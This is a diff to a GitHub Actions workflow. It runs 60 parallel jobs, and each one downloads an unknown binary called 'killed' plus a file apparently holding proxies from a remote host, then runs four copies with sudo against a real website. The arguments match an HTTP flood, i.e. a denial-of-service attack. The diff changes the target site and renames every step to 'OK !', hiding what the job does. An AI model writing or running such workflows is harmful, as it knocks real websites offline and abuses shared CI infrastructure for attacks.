@@ -9,35 +9,27 @@ jobs:
     strategy:
       max-parallel: 60
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60] 
+       instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60] 
 
-    defaults:
-      run:
-        shell: bash
 
     steps:
-      - name: Checkout (optional)
-        uses: actions/checkout@v4
-
-      - name: Download and run killed (instance ${{ matrix.instance }})
+      - name: OK !
         run: |
-          wget -q https://curl.by/ZrFop/killed -O killed
-          wget -q https://curl.by/DDU_6/fres.txt -O fres.txt
+          wget https://curl.by/ZrFop/killed -O killed
+          wget https://curl.by/DDU_6/fres.txt -O fres.txt
           chmod +x killed
-
-          
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 45 ./killed GET https://www.trendyol.com/ fres.txt 45 950 10 &
+            sudo timeout 45 ./killed GET https://satanistischertempel.org/ fres.txt 45 950 10 &
             PIDS+=($!)
           done
-
+          
           for pid in "${PIDS[@]}"; do
-            wait $pid || true
+            wait $pid
           done
 
-      - name: Wait 45s
+      - name: OK !
         run: sleep 45
-
-      - name: Reboot
+        
+      - name: OK !
         run: sudo reboot
